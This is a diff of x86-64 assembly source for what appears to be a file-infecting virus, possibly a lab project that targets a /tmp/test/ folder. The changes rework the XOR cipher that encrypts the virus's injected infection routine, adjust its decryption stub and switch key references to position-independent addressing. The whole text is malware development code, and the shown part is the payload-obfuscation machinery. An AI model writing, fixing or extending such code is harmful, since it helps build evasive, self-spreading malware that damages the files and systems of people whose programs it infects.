@@ -77,7 +77,7 @@ uncipher:
 	je .end						; 	goto .end;
 
 	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
-	lea rdx, [key]					; key = key
+	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
 	.end:
@@ -378,7 +378,7 @@ treat_file:
 	add rdi, [filesize]				;
 	add rdi, infection_routine - begin		;
 	mov rsi, cipher_stop - infection_routine	; size = cipher_stop - infection_routine
-	lea rdx, [key]					; key = key
+	lea rdx, [rel key]				; key = key
 	call xor_cipher					; xor_cipher(data, size, key)
 
 	; change cipher address in injected code (uncipher)
@@ -757,28 +757,31 @@ print_string:
 xor_cipher:
 	push rdx					; save key
 
-    xor_loop:
-        cmp rsi, 0					; if (size == 0)
-        je xor_end					; 	goto xor_end
+	.loop:
+		cmp rsi, 0				; if (size == 0)
+		je .end					; 	goto .end
 
-        mov al, [rdi]					; al = *data
-        mov bl, [rdx]					; bl = *key
-        xor al, bl					; al ^= bl
-        mov [rdi], al					; *data = al
+		mov al, [rdi]				; al = *data
+		mov bl, [rdx]				; bl = *key
+		xor al, bl				; al ^= bl
+		mov [rdi], al				; *data = al
 
-        inc rdi						; data++
-        inc rdx						; key++
-        dec rsi						; size--
+		inc rdi					; data++
+		inc rdx					; key++
+		dec rsi					; size--
 
-        cmp byte [rdx], 0				; if (*key != 0)
-        jne xor_loop					; 	goto xor_loop
+		cmp byte [rdx], 0			; if (*key == 0)
+		je .key_reset				; 	goto .key_reset
 
-	mov rdx, [rsp] 					; restore key
-        jmp xor_loop					; goto xor_loop
+		jmp .loop				; goto .loop
 
-    xor_end:
-	pop rdx						; restore key
-        ret						; return
+	.key_reset:
+		mov rdx, [rsp]				; restore key
+		jmp .loop				; goto .loop
+
+	.end:
+		pop rdx					; reset stack
+		ret					; return
 
 section .data
 	infected_folder_1: db "/tmp/test/", 0
